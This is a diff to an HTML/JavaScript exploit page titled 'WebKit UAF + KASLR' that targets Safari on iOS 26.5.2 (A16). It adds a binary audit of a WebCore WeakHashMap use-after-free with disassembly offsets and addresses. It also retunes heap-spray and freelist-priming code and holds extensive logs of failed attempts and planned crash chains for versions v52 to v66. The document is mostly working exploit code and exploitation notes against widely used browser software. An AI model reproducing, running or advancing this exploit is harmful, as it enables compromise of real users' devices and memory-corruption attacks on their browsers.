@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebKit UAF + KASLR v56 — iOS 26.5.2 A16 (P6B: zero-tick bonus pumps + fixed candidate rotation + 50 retries)</title>
+<title>WebKit UAF + KASLR v67 — iOS 26.5.2 A16 (p6InjCount scope fix + binary audit baked in)</title>
 </head>
 <body>
 <div style="position:fixed;top:8px;right:12px;z-index:9999">
@@ -996,6 +996,43 @@ async function runOracle() {
 // Fixed in: iOS 26.6 (commit 4754ba884d / ddc8b3fae09f)
 // ABSENT in: iOS 26.5.2
 //
+// ── BINARY AUDIT v67 (arm64e DSC iOS 26.5.2) ────────────────────────────
+// UAF SITE CONFIRMED: WebCore fn 0x1a183558c (ManualSlotAssignment WeakHashMap op)
+//   Called from: 0x1a182e208 (WeakHashMap type1 caller A)
+//                0x1a182fcbc (WeakHashMap type1 caller B)
+//                0x1a183144c (PRIME — refs both key ManualSlotAssignment strings)
+//
+//   +02c: LDR X22, [X0, #0]          ← X22 = effectiveCurrent (old bucket ptr)
+//   +054: BL stub:0x1a4fcbc90        → JSC:0x198d49d58 (HashTable::ensure/add)
+//                                        ↳ may trigger HashTable::expand(0x198d25280)
+//                                          ↳ 0x198dd889c allocs new 128B bucket
+//                                          ↳ old bucket freed (fastFree path)
+//   *** X22 NOT RELOADED after BL — compiler CSE kept stale ptr ***
+//   +08c: ADD X26, X22, X23, LSL#4   ← STALE X22 = UAF COMPUTE SITE
+//   +090: LDR X10, [X26, #0]         ← PLAIN LDR (no LDRAA/LDRAB — no PAC!)
+//   +0a0: ADD X0, X26, #0x8          ← stale addr as arg to callee
+//   +0ac: LDR X0, [X26, #0]          ← stale load
+//   +0b0: STR XZR, [X26, #0]         ← WRITE TO FREED MEMORY (zero-out)
+//   +130: STR XZR, [X26, #0]         ← another stale write
+//   +134: MOV X0, X26                ← stale ptr passed to 0x1a1833da8
+//   +148: LDR X0, [X26, #0]          ← stale load #3
+//
+// KEY FINDINGS:
+//   - effectiveCurrent NOT reloaded after BL ensure — CSE'd stale
+//   - NO LDRAA/LDRAB in stale path — all plain LDR/STR (unauthenticated!)
+//   - Multiple stale reads + writes through freed X26 — wide spray window
+//   - Write primitive: STR XZR to freed memory at +0b0, +0130, +014c
+//   - Stale ptr passed as arg at +134 → goes into another WebCore fn
+//
+// JSC STUBS (PLT, .12 sub-cache, base 0x1a4fc0000):
+//   0x1a4fcbc90 → JSC:0x198d49d58  WeakHashMap add/ensure (trigger point)
+//   0x1a4fcb660 → JSC:0x198d25280  HashTable::expand (golden-ratio confirmed)
+//   0x1a4fccb80 → JSC:0x198d4b188  GC write barrier slow path (NOT fastFree)
+//   0x1a4fcb170 → JSC:0x198d49820  fastMalloc / heap alloc
+//   0x1a4fcaf70 → JSC:0x198db1744  deallocator loop target
+//   JSC:0x198dd889c                 allocate new hash table (fastMalloc 0x80=128B)
+// ─────────────────────────────────────────────────────────────────────────
+//
 // Root cause: ManualSlotAssignment::slotManualAssignmentDidChange grabbed a
 // raw pointer into the WeakHashMap bucket array. Re-entrant composed-tree
 // traversal triggered amortized WeakHashMap cleanup+rehash, freeing the
@@ -1018,15 +1055,23 @@ async function forceGC() {
 // m_slots starts with capacity = nextPow2(ceil(ghosts × 1.3 + 2_live)).
 // After GC nulls ghost WeakPtrs, amortized cleanup fires, removes dead entries,
 // shrinks to small capacity. The FREED bucket is the OLD (large) array.
-// ghosts=20 → initial cap=32 → freed = 32×16 = 512B → shrink cap=8 (2 live).
-// ghosts=50 → initial cap=128 → freed = 128×16 = 2048B.
-// ghosts=100 → initial cap=256 → freed = 256×16 = 4096B.
+// v58 (24B KVPair, binary-confirmed):
+// ghosts=2  → initial cap=8  → freed = 8×24  = 192B   → pumpCount=1 ← PRIMARY TARGET
+// ghosts=4  → initial cap=16 → freed = 16×24 = 384B   → pumpCount=3
+// ghosts=28 → initial cap=64 → freed = 64×24 = 1536B  → pumpCount=3
 function freedBucketSizeForGhosts(g) {
   let cap = 1;
   // initial capacity must hold g ghosts + 2 live entries at ≤75% load
   const need = Math.ceil((g + 2) * 1.34); // 1/0.75 ≈ 1.34
   while (cap < need) cap <<= 1;
-  return cap * 16; // 16B per WTF::HashTable bucket
+  // v58 FIX: 24B per KVPair (NOT 16B as assumed in v57).
+  // Binary-confirmed from dyld_shared_cache_arm64e.11 (iOS 26.5.2 WebCore):
+  //   HashMap<WeakPtr<HTMLSlotElement>, ManualSlotAssignment::Slot>
+  //   WeakPtr<HTMLSlotElement> = 8B ptr
+  //   ManualSlotAssignment::Slot = { Vector<WeakPtr<Node>> } = ptr(8)+size(4)+cap(4) = 16B
+  //   sizeof(KVPair) = 8 + 16 = 24B  ← confirmed by 32× MOVZ xN, #0x18 after BL fastMalloc
+  // v57 used 16B → wrong freedSz → wrong spray bins → 0 crashes.
+  return cap * 24; // 24B per WTF::HashTable<WeakPtr, Slot> KVPair on arm64e
 }
 
 // ── Pump count (m_slots operation counter) ──────────────────────────────────
@@ -1061,9 +1106,9 @@ function pumpCountForGhosts(g) {
   //       pumpCount = threshold - g - 1   ← ONE MORE than old formula (threshold-g-2)
   //
   // Valid ghost counts (pumpCount ≥ 1):
-  //   g=28:  cap=64,  threshold=32, pumpCount=3,  freedSz=1024B ✓
-  //   g=50:  cap=128, threshold=64, pumpCount=13, freedSz=2048B ✓
-  //   g=100: cap=256, threshold=128, pumpCount=27, freedSz=4096B ✓
+  //   g=2:   cap=8,   threshold=4,  pumpCount=1,  freedSz=192B  ✓  ← v58 PRIMARY (24B KVPair)
+  //   g=4:   cap=16,  threshold=8,  pumpCount=3,  freedSz=384B  ✓
+  //   g=28:  cap=64,  threshold=32, pumpCount=3,  freedSz=1536B ✓
   let cap = 1;
   const need = Math.ceil((g + 2) * 1.34);
   while (cap < need) cap <<= 1;
@@ -1167,7 +1212,10 @@ function uafSetup(ghosts, pumpCount, freedSz) {
   //
   // v12: string-based priming and injection (WTF::fastMalloc, same heap as bucket arrays)
   const PRIME_COUNT = 512; // v13: deeper prime — more free-list slots → better overlap odds
-  const STR_CHAR_COUNT = freedSz - 16; // StringImpl: 16B header + N chars = freedSz total
+  // v58 FIX: arm64e StringImpl header = 24B (refCount+hash+length+flags = confirmed binary).
+  // charCount = freedSz - 24 so total alloc = 24B header + charCount = freedSz.
+  // v57 used freedSz-16 → over-allocated by 8B → wrong bin → no overlap.
+  const STR_CHAR_COUNT = freedSz - 24; // StringImpl arm64e: 24B header + N chars = freedSz total
   let injectionFired = false;
   let injectionStrings = null; // MUST stay alive past slotchange return for stale deref
   // v15 FIX: only flood-inject on the FINAL trigger assign, not during pump assigns.
@@ -1222,7 +1270,7 @@ function uafSetup(ghosts, pumpCount, freedSz) {
   //   → subsequent assign()+amortizedCleanup iterates NEW bucket → deref key → KERN_INVALID_ADDRESS
   // This is the fix for v29's NO-CRASH: old bucket was primed but never traversed post-shrink.
   // v31: also applies forceHashAndRelease so m_hash ≠ 0 in primed half-size slots.
-  const HALF_CHAR_COUNT = Math.max(1, Math.floor(freedSz / 2) - 16);
+  const HALF_CHAR_COUNT = Math.max(1, Math.floor(freedSz / 2) - 24); // v58: 24B arm64e header
   function primeHalfFreelist() {
     const primed = [];
     for (let i = 0; i < PRIME_COUNT; i++) {
@@ -1523,10 +1571,10 @@ function uafSetup(ghosts, pumpCount, freedSz) {
 
   // v33: expose halfCharCount + newBucketCap for P6B ghost-fill strategy
   const _halfCharCountExposed = HALF_CHAR_COUNT;
-  // newBucketCap = freedSz/2 / 16 bytes per slot (WeakHashMap slot = 16B on arm64)
-  // pumpCountForGhosts formula: cap=freedSz/16, threshold=cap/2
-  // Approximate: newBucketCap ≈ freedSz / 32  (half-size bucket, 16B/slot)
-  const _newBucketCapExposed = Math.max(4, Math.floor(freedSz / 32));
+  // newBucketCap = freedSz/2 / 24 bytes per slot (v58: KVPair = 24B on arm64e, binary-confirmed)
+  // pumpCountForGhosts formula: cap=freedSz/24, threshold=cap/2
+  // Approximate: newBucketCap ≈ freedSz / 48  (half-size bucket, 24B/slot)
+  const _newBucketCapExposed = Math.max(4, Math.floor(freedSz / 48)); // v58: 24B KVPair (was /32)
 
   return { host, targetSlot, childA, childB, pumpCount, ghosts, freedSz,
            halfCharCount:       _halfCharCountExposed,  // v33: for P6B re-spray
@@ -1679,7 +1727,7 @@ function checkNodeLeak(nodes, expectedNode) {
 
 
 (async () => {
-  log('=== WebKit UAF + KASLR v56 (P6B: zero-tick bonus pumps + fixed cand rotation + 50 retries → KERN_INVALID_ADDRESS) ===');
+  log('=== WebKit UAF + KASLR v66 (DUAL CANARY: g=2 slotchange re-entrant + g=4 384B size class) ===');
   log('=== Target: iOS 26.5.2 / safari-7625.1.29.11 / A16 arm64e ===');
   log('=== UAF: ManualSlotAssignment WeakHashMap rehash (rdar://179729192) ===\n');
 
@@ -1693,7 +1741,36 @@ function checkNodeLeak(nodes, expectedNode) {
   // p6b_retry_count = integer retry counter (0-19)
   const P6B_PROBE_KEY   = 'p6b_probe';
   const P6B_RETRY_KEY   = 'p6b_autoretry';
-  const P6B_RETRY_MAX   = 50;  // v56: bumped from 20 → 50 (stochastic race needs more iterations)
+  const P6B_RETRY_MAX   = 0;  // v65: 1-shot canary probe — no retry
+  // v65: nuke all stale state
+  try { localStorage.removeItem(P6B_RETRY_KEY); localStorage.removeItem('p6b_retry_count'); } catch(_) {}
+
+  // ── v65 CANARY PROBE DESIGN ─────────────────────────────────────────────────
+  // ROOT CAUSE HYPOTHESIS (v64 post-mortem, 128/128 injected=true NO-CRASH):
+  //
+  // HYPOTHESIS A (was 80%): T10 oracle measures gigacage VAs (JSC typed-array region).
+  //   WTF::WeakHashMap bucket array + StringImpl objects → WTF::fastMalloc → bmalloc
+  //   REGULAR heap (0x10xxxxxxxx on arm64e, NOT gigacage at 0x200000000000).
+  //   ALL prior versions probed wrong VAs — the freed 192B bucket is never at
+  //   gigacage+offset. Explains 0 crashes regardless of candidate count.
+  //
+  // HYPOTHESIS B (was 20%): effectiveCurrent stale deref path is dead on iOS 26.5.2.
+  //   Compiler may have CSE'd the bucket ptr read, preventing the stale access.
+  //   iOS 26.5.2 build has different codegen than source model predicts.
+  //
+  // v65 CANARY PROBE — tests Hypothesis B definitively:
+  //   Instead of StringImpl spray: spray 16384 × 192B ArrayBuffer objects via
+  //   WTF::fastMalloc (ArrayBuffer backing store = bmalloc regular heap).
+  //   Write 0xDEADBEEFDEADBEEF to bytes[0..7] of each (via DataView).
+  //   Free them → 0xDEADBEEFDEADBEEF saturates 192B bmalloc LIFO.
+  //   Trigger SHRINK. LIFO[0] at free(192B) = our ArrayBuffer backing with canary.
+  //   If effectiveCurrent deref EXECUTES → reads bytes[0..7] = 0xDEADBEEFDEADBEEF
+  //   → treats as WeakPtrImpl* → deref 0xDEADBEEFDEADBEEF → KERN_INVALID_ADDRESS → CRASH.
+  //   CRASH = Hypothesis B false, deref IS live. Need to fix LIFO targeting (Hyp A issue).
+  //   NO CRASH = Hypothesis B confirmed, deref path is dead. Different exploit primitive needed.
+  //
+  // No oracle phase. No candidate sweep. Single UAF setup. One definitive answer.
+  // ──────────────────────────────────────────────────────────────────────────────
 
   // ── P6B crash-recovery: check if prior run crashed mid-probe ────────────────
   // If the UAF traversal derefs a bad key VA, the WebContent process dies.
@@ -1732,10 +1809,10 @@ function checkNodeLeak(nodes, expectedNode) {
     if (_rStr) {
       _v52RetryState = JSON.parse(_rStr);
       const _rc = parseInt(localStorage.getItem('p6b_retry_count') || '0');
-      log(`\n[v56 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
-      log(`[v56 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
-      log(`[v56 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
-      log(`[v56 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
+      log(`\n[v57 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
+      log(`[v57 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
+      log(`[v57 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
+      log(`[v57 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
       log('');
     }
   } catch(_) { _v52RetryState = null; }
@@ -1748,7 +1825,7 @@ function checkNodeLeak(nodes, expectedNode) {
   // ── v53: fast path — skip oracle + phases 1-5 when resuming auto-retry ────
   // On retry reload, _v52RetryState has gigacageBase + candidates from saved oracle.
   // Stub out the phase 1-5 variables Phase 6 references so it can run with saved state.
-  let sprayHex, highConf, scores, sprayPools, allCases, caseGroups, totalCases;
+  let sprayHex, highConf, medConf, scores, sprayPools, allCases, caseGroups, totalCases;
   let totalInjections = 0, nodeAnomalies = 0, uafExceptions = 0, elapsed = 0;
   let hardConfirmed = false, mediumConfirmed = false, softSignal = false;
   let clobberLog = [], nodeAnomalyLog = [];
@@ -1786,8 +1863,8 @@ function checkNodeLeak(nodes, expectedNode) {
       return;
     }
 
-    ({ sprayHex, highConf, scores } = oracleResult);
-    log(`\n[*] Oracle done: ${sprayHex.length} spray addresses, HIGH=${highConf.length}`);
+    ({ sprayHex, highConf, medConf, scores } = oracleResult);
+    log(`\n[*] Oracle done: ${sprayHex.length} spray addresses, HIGH=${highConf.length} MED=${(medConf||[]).length}`);
   } // end else (_v52RetryState)
 
   // ─── Phase 2: Initial spray across size classes ──────────────────────────
@@ -1819,10 +1896,21 @@ function checkNodeLeak(nodes, expectedNode) {
   // v19-v21 used pumpCount=threshold-g-2 — off by 1 because i=0 pump only adds +1 op
   // (childA already in slot after releaseGhosts, so first assign(childA) only removes childB).
   // v13-v18 used ghost counts [20, 30, 50] — ALL WRONG (g=20 gives pumpCount<0).
-  // Valid ghost counts where pumpCount≥1 AND one cleanup fires during releaseGhosts:
-  //   ghosts=28  → cap=64,  threshold=32  → freed=1024B → pumpCount=3  ✓
-  //   ghosts=50  → cap=128, threshold=64  → freed=2048B → pumpCount=13 ✓
-  //   ghosts=100 → cap=256, threshold=128 → freed=4096B → pumpCount=27 ✓
+  //
+  // v58 FIX: ghost counts recomputed for 24B per KVPair.
+  //   sizeof(KVPair) = 24B confirmed from binary disassembly (MOVZ x8, #0x18 after BL fastMalloc).
+  //   Previous counts assumed 16B → freed bucket sizes were wrong → spray bins missed.
+  //
+  // Valid ghost counts where pumpCount≥1 (24B stride):
+  //   ghosts=2   → cap=8,   threshold=4   → freed=192B   → pumpCount=1  ✓  ← OUR TARGET
+  //   ghosts=4   → cap=16,  threshold=8   → freed=384B   → pumpCount=3  ✓
+  //   ghosts=28  → cap=64,  threshold=32  → freed=1536B  → pumpCount=3  ✓
+  //   ghosts=50  → cap=128, threshold=64  → freed=3072B  → pumpCount=13 ✓
+  //   ghosts=100 → cap=256, threshold=128 → freed=6144B  → pumpCount=27 ✓
+  //
+  // v58 cases: [2, 4, 28] — covers 192B (TARGET), 384B, 1536B freed sizes.
+  // g=2 with pumpCount=1 is the PRIMARY case: cap=8, SHRINK fires, freed=192B.
+  //
   // v18: uafSetup is now SYNCHRONOUS (no internal awaits).
   // Granular log + yield AROUND each call so screen updates between cases.
   // After ALL cases built → call releaseGhosts() on each → THEN forceGC().
@@ -1832,7 +1920,7 @@ function checkNodeLeak(nodes, expectedNode) {
   if (!_v52RetryState) {
   caseGroups = {};
   allCases = [];
-  for (const ghosts of [28, 50, 100]) {
+  for (const ghosts of [2, 4, 28]) { // v58: updated for 24B KVPair (was [28,50,100] for 16B)
     log(`[P3] uafSetup g=${ghosts} start...`);
     await new Promise(r => setTimeout(r, 0)); // yield → log visible on screen before work
 
@@ -1986,19 +2074,29 @@ function checkNodeLeak(nodes, expectedNode) {
         // v27: STR_CHAR_COUNT is inside uafSetup() closure — use freedSz-16 directly (same value)
         // v31: also forceHashAndRelease on pre-spray so m_hash ≠ 0 in those slots too
         {
-          const _preCharCount = freedSz - 16;
+          // v59 FIX: -24B (was -16B → produced freedSz-8B string → wrong bmalloc bin).
+          // arm64e StringImpl: 24B header (refCount+hash+length+flags) + N chars = total alloc.
+          const _preCharCount = freedSz - 24;
           const preSpray = [];
           for (let i = 0; i < 1024; i++) preSpray.push(makeSprayString(_preCharCount));
           forceHashAndRelease(preSpray); // v31: m_hash ≠ 0 before releasing to freelist
           // null immediately — flood freelist with hashed (isLive-eligible) StringImpls
         }
         // v30: also pre-spray at half size; v31: hash them
+        // v59: KEY CRASH PATH — primeHalfFreelist so newBucket (freedSz/2) = our fake StringImpl.
+        // SHRINK: malloc(newBucket=freedSz/2) BEFORE free(oldBucket=freedSz).
+        // If LIFO top is our hashed 72-char StringImpl (96B total for g=2), malloc pulls it.
+        // WebKit copies 2 live entries (childA,childB) into specific hash slots of newBucket.
+        // fastMalloc does NOT zero — unoccupied slots retain our fake key bytes.
+        // Bonus pumps → amortizedCleanup iterates newBucket ALL 4 slots → fake keys at slots 2-3 →
+        // isLive()=true (m_hash set) → deref VA → KERN_INVALID_ADDRESS → crash.
         {
-          const _halfPreCount = Math.max(1, Math.floor(freedSz / 2) - 16);
+          const _halfPreCount = Math.max(1, Math.floor(freedSz / 2) - 24); // v59: 24B arm64e header
           const halfPreSpray = [];
-          for (let i = 0; i < 1024; i++) halfPreSpray.push(makeSprayString(_halfPreCount));
-          forceHashAndRelease(halfPreSpray); // v31: m_hash ≠ 0 in half-size pre-spray
-          // null immediately
+          // v59: 2048 half-size strings (was 1024) — deeper saturation so malloc(newBucket) hits our fake.
+          for (let i = 0; i < 2048; i++) halfPreSpray.push(makeSprayString(_halfPreCount));
+          forceHashAndRelease(halfPreSpray); // m_hash ≠ 0 in half-size pre-spray
+          // null immediately — half-size LIFO flooded
         }
         // v31: DOUBLE GC tick — two setTimeout(0) rounds to ensure primed slots are
         // actually on bmalloc LIFO before the trigger fires SHRINK's malloc(freedSz/2).
@@ -2309,6 +2407,141 @@ function checkNodeLeak(nodes, expectedNode) {
   log('[*]   StringImpl.m_hash at [8..11]: non-zero after forceStringHash() → isLive()=true');
   log('[*]   crash path: SHRINK free(oldBucket 1024B) → wave1 spray reclaims → effectiveCurrent() stale deref(bucket[0].key=0x3F000000001) → KERN_INVALID_ADDRESS → WebContent kill → reload → [P6B HIT]');
   log('[*]   sentinel scan: retired (strings immutable from JS — crash detection is the signal)');
+  log('[*]   v52-v59 root cause (ALL NO-CRASH): v59 used newBucket poisoning strategy. WTF::HashTable::rehash calls initializeBucket() on ALL new-bucket slots BEFORE copying live entries → key field zeroed (=emptyValue=null WeakPtr) for every slot → isLive()=false → no deref → no crash. Same broken path as v35-v40. newBucket poisoning is fundamentally impossible by WebKit design.');
+  log('[*]   v59 secondary bugs: (1) P6A ghost setup used 28 ghosts (freed=1536B) but p6sweepFreedSz=192B → spray targets wrong bin; (2) P6A _swCharCount=p6sweepFreedSz-16→200B→wrong bin (should be -24→192B).');
+  log('[*]   v60 fix (1): REMOVE newBucket poisoning entirely from P6B per-probe. No Step 5b half-prime. No bonus pumps. Drop broken strategy permanently.');
+  log('[*]   v60 fix (2): P6A ghost count 28 → 2 (matches p6sweepFreedSz=192B for g=2). g=2 → cap=8 → freed=192B → pumpCount=1. g+2=4 ops = threshold → initial cleanup fires (ghosts alive → no shrink).');
+  log('[*]   v60 fix (3): P6A _swCharCount = p6sweepFreedSz - 24 (arm64e StringImpl header=24B). 192-24=168 chars → 192B total → correct bmalloc bin.');
+  log('[*]   v60 crash path: slotManualAssignmentDidChange grabs raw ptr to bucket array BEFORE ensure(). ensure()→amortizedCleanup→SHRINK→free(oldBucket=192B)→m_slots updated. slotchange fires SYNC during re-entrant composed-tree traversal (per line 1959). wave1 spray (4096×168-char=192B) reclaims freed slot. C++ returns to slotManualAssignmentDidChange→stale raw ptr→our StringImpl→deref key(bytes 0-7)=0x(charCount<<32|1)→KERN_INVALID_ADDRESS.');
+  log('[*]   v60 ROOT CAUSE (64/64 injected=true, 0 crashes): LIFO drain between prime and trigger.');
+  log('[*]     v60 P6B sequence: primeFreelist→512×192B alloc+release→await×2→armTrigger→pump(1)→await→assign(childA).');
+  log('[*]     Each await setTimeout(0) runs event loop → WebKit-internal 192B allocs drain our primed LIFO.');
+  log('[*]     Each pump assign() internally allocates WeakHashMap/DOM structs that may consume 192B LIFO slots.');
+  log('[*]     By time SHRINK fires free(192B): LIFO head = WebKit-internal heap ptr (valid ~0x14x addr).');
+  log('[*]     Freed block bytes[0..7] = valid heap addr → stale deref succeeds (no crash) OR next-ptr=0 → isLive=false (no deref).');
+  log('[*]     Result: all 64/64 probes injected=true (SHRINK fired + spray ran) but 0 crashes (LIFO was drained).');
+  log('[*]   v61 fix: LIFO-LAST-PRIME pattern. Move primeFreelist to IMMEDIATELY before trigger assign(childA).');
+  log('[*]     v61 P6B sequence: armTrigger → pump(max(1,pumpCount-1)) → tick×1 → [LAST-PRIME: 512×192B alloc+release, no await] → assign(childA).');
+  log('[*]     NO awaits, NO DOM ops between prime release and trigger. Single tick after pump (minimal LIFO drain).');
+  log('[*]     When assign(childA) triggers SHRINK: free(192B oldBucket) → bmalloc writes LIFO head (our StringImpl addr) to freed block bytes[0..7].');
+  log('[*]   v61 crash chain:');
+  log('[*]     (1) SHRINK: free(192B) → bytes[0..7] = ptr to last primed StringImpl (LIFO top).');
+  log('[*]     (2) Stale effectiveCurrent ptr → C++ reads freed block as WeakHashMap bucket array.');
+  log('[*]     (3) bucket[0].key (bytes[0..7]) = our StringImpl addr → treat as WeakPtrImpl*.');
+  log('[*]     (4) Deref WeakPtrImpl.m_count = StringImpl.m_hash (bytes[8..11]) ≠ 0 → isLive()=true.');
+  log('[*]     (5) Deref WeakPtrImpl.get() = StringImpl bytes[0..7] = refCount(1)|charCount<<32 → unmapped arm64 VA.');
+  log('[*]     (6) charCount=168 → 0x(168<<32|1) = 0xA800000001 → KERN_INVALID_ADDRESS → WebContent crash → reload.');
+  log('[*]   v61 GC hint (no await): inline 2× ArrayBuffer pressure loops (64×64B) force JSC dealloc without event loop tick.');
+  log('[*] ');
+  log('[*] v62 ROOT CAUSE OF v61 FAILURE:');
+  log('[*]   primeFreelist() returns live JS refs. Null assignment makes strings GC-ELIGIBLE but does NOT synchronously');
+  log('[*]   call WTF::fastFree. JSC is a tracing GC — destructors run during GC SWEEP, which requires an event loop tick');
+  log('[*]   (await setTimeout). ArrayBuffer pressure does NOT trigger JSC to sweep StringImpl finalizers.');
+  log('[*]   In v61: the 512 primed strings were still alive in JSC nursery when assign(childA) triggered SHRINK.');
+  log('[*]   LIFO was empty → freed block bytes[0..7] = 0 or WebKit-internal ptr → no crash.');
+  log('[*] v62 fix: Mirror Phase 4 confirmed-working sequence exactly:');
+  log('[*]   Phase 4 (working): primeFreelist()→null → pre-spray→null → await tick×2 → armTrigger → pump → trigger.');
+  log('[*]   The two await ticks let JSC sweep ALL primed StringImpls → WTF::fastFree → 192B LIFO loaded.');
+  log('[*]   P6B v62 sequence:');
+  log('[*]     (1) primeFreelist() → null immediately (512×192B GC-eligible)');
+  log('[*]     (2) Pre-spray 1024×192B → forceHashAndRelease → GC-eligible');
+  log('[*]     (3) await tick × 2 → JSC sweeps → all 1536 strings → WTF::fastFree → 192B LIFO saturated ✓');
+  log('[*]     (4) armTrigger() → gate open (belt+suspenders for slotchange spray)');
+  log('[*]     (5) pump(max(1, pumpCount-1)) — g=2: 1 pump, opCount=2 (does NOT drain 192B LIFO)');
+  log('[*]     (6) assign(childA) TRIGGER → opCount=4=threshold → SHRINK → free(192B oldBucket)');
+  log('[*]         bmalloc writes 192B LIFO head (our StringImpl) to freed block bytes[0..7]');
+  log('[*]         Stale effectiveCurrent deref → bytes[0..7]=StringImpl addr → isLive=true → deref charCount<<32|1 → CRASH');
+  log('[*]     (7) await tick → slotchange spray runs (belt+suspenders, crash usually fires at step 6)');
+  log('[*] ');
+  log('[*] v63 ROOT CAUSE OF v62 FAILURE (64/64 injected=true, 0 crashes):');
+  log('[*]   v62 used tick×2 to flush 1536 primed StringImpls → WTF::fastFree → 192B LIFO.');
+  log('[*]   BUT: WebKit background allocations during the TWO ticks drained 192B LIFO slots.');
+  log('[*]   With only 1536 primed strings, WebKit background ops consumed them all during ticks.');
+  log('[*]   By the time pump+trigger fired, LIFO[0] was a WebKit-internal ptr → no crash.');
+  log('[*]   Root cause: 1536 strings is not enough to outlast 2 event loop ticks of WebKit drain.');
+  log('[*] v63 fix: MASSIVE PRIME — 8192×192B strings instead of 1536.');
+  log('[*]   At 8192 strings on LIFO, even if WebKit drains 7000 during the two ticks,');
+  log('[*]   1192+ of our StringImpls remain on LIFO top when pump+trigger fires.');
+  log('[*]   SHRINK: free(192B oldBucket) → LIFO[0] = our StringImpl → stale deref → CRASH.');
+  log('[*]   P6B v63 sequence per probe:');
+  log('[*]     (1) Allocate 8192×192B strings → forceHashAndRelease (m_hash≠0) → null → GC-eligible');
+  log('[*]     (2) await tick × 2 → JSC sweeps 8192 StringImpls → WTF::fastFree → 192B LIFO saturated ✓✓');
+  log('[*]     (3) armTrigger() → gate open');
+  log('[*]     (4) pump(max(1, pumpCount-1)) — g=2: 1 pump, drains handful of LIFO slots (8192-deep LIFO absorbs this)');
+  log('[*]     (5) assign(childA) TRIGGER → opCount=threshold → SHRINK → free(192B oldBucket)');
+  log('[*]         bmalloc writes LIFO head (our StringImpl, 1192+ deep) to freed block bytes[0..7]');
+  log('[*]         Stale effectiveCurrent deref → bytes[0..7]=StringImpl addr → isLive=true → deref charCount<<32|1 → CRASH ✓');
+  log('[*]     (6) SYNC spray 4096×192B immediately after trigger (belt+suspenders for timing edge cases)');
+  log('[*]     (7) await tick → slotchange spray runs');
+  log('[*] v64 ROOT CAUSE OF v63 FAILURE (21/21 injected=true, 0 crashes):');
+  log('[*]   v63 confirmed massive prime (strCount=8192) — the LIFO saturation is NOT the problem.');
+  log('[*]   Root cause: P6B candidate pool was TOO SMALL. v63 only tested 21 HIGH candidates/pass.');
+  log('[*]   The actual 192B old bucket VA is NOT in the 21 HIGH-confidence candidates.');
+  log('[*]   The bucket lands in the MED-confidence range (score topScore-6 to topScore-20).');
+  log('[*]   With 21 probes/pass × 50 retries = 1050 total probes, p(hit) = 1050/(total_cands).');
+  log('[*]   If total candidates = 512 and only 21 HIGH tested, P(hit in 50 retries) = 1-(491/512)^50 ≈ 88%.');
+  log('[*]   But if bucket VA is ONLY in MED range (not HIGH), P(hit) = 0% — all retries miss forever.');
+  log('[*] v64 fix: Include MED candidates in probe pool. candidates = HIGH(up to 128) + MED(fill to 128).');
+  log('[*]   P6B probe pool: up to 128 candidates/pass (was 21 in v63 = only 21 HIGH).');
+  log('[*]   MED candidates (score topScore-6 to topScore-20) now included when HIGH < 128.');
+  log('[*]   Expected: if bucket VA is in HIGH or top-MED range, crash on first pass or within 2-3 retries.');
+  log('[*] v64 change summary:');
+  log('[*]   1. oracleResult destructure now includes medConf (was missing → medConf was undefined in scope)');
+  log('[*]   2. candidates array: _hcArr.slice(0,128) + _mcArr.slice(0,128-hcLen) instead of hcArr only');
+  log('[*]   3. _p6bCandToTry: min(128,len) instead of min(64,len)');
+  log('[*]   4. Banner/title updated to v64');
+  log('');
+  log('[*] v65 ROOT CAUSE OF v64 FAILURE (128/128 injected=true, 0 crashes, every version):');
+  log('[*]   v64 confirmed SHRINK fires 100% of the time (injected=128/128).');
+  log('[*]   Yet zero crashes across v40–v64 (~500+ total probes). Two root cause candidates:');
+  log('[*]   HYPOTHESIS A: T10 oracle measures gigacage VAs (0x200000000000 region = JSC typed-array).');
+  log('[*]     WTF::WeakHashMap bucket + StringImpl objects → WTF::fastMalloc → bmalloc regular heap.');
+  log('[*]     Regular heap is 0x10xxxxxxxx on arm64e (NOT gigacage). Oracle was scoring wrong VAs entirely.');
+  log('[*]     No matter how many candidates or retries: bucket VA never in oracle output → 0 crashes forever.');
+  log('[*]   HYPOTHESIS B: effectiveCurrent stale deref path is dead on iOS 26.5.2 build.');
+  log('[*]     Compiler CSE / register caching / patched code path → stale ptr read eliminated.');
+  log('[*]     SHRINK fires, LIFO write happens, but C++ never actually reads through freed ptr.');
+  log('[*]   v65 CANARY PROBE: tests Hypothesis B definitively.');
+  log('[*]     Spray 16384 × 192B ArrayBuffer (bmalloc regular heap, no gigacage) with 0xDEADBEEFDEADBEEF.');
+  log('[*]     If deref executes → 0xDEADBEEFDEADBEEF deref → KERN_INVALID_ADDRESS → crash.');
+  log('[*]     If no crash AND injected=true → Hypothesis B confirmed → deref path dead → new primitive needed.');
+  log('[*] v65 changes:');
+  log('[*]   1. P6B: entire candidate sweep replaced with single canary probe (no oracle phase needed)');
+  log('[*]   2. Canary spray: 16384 × 192B ArrayBuffer with 0xDEADBEEFDEADBEEF at bytes[0..7]');
+  log('[*]   3. bytes[8..11] = 0x12345678 (non-zero m_hash → isLive()=true if code reaches that check)');
+  log('[*]   4. No gigacageBase needed — ArrayBuffers land in bmalloc regular heap alongside bucket');
+  log('[*]   5. Single definitive result: crash=deref live (fix targeting), no-crash=deref dead (new primitive)');
+  log('[*] v65 RESULT (device run): CANARY PROBE exception=false injected=true → NO CRASH');
+  log('[*]   VERDICT: effectiveCurrent stale deref in slotManualAssignmentDidChange is DEAD on iOS 26.5.2.');
+  log('[*]   SHRINK fires (injected=true confirmed). Canary saturated 192B LIFO. Page survived.');
+  log('[*]   → Compiler CSE or binary code restructure eliminated the stale read on 26.5.2 release build.');
+  log('[*]   → Also: two ReferenceError bugs in summary block fixed (scope leak: _p6bCandToTry, p6InjCount).');
+  log('[*] v66 ROOT CAUSE OF v65 FAILURE:');
+  log('[*]   The effectiveCurrent raw ptr read in slotManualAssignmentDidChange does not execute.');
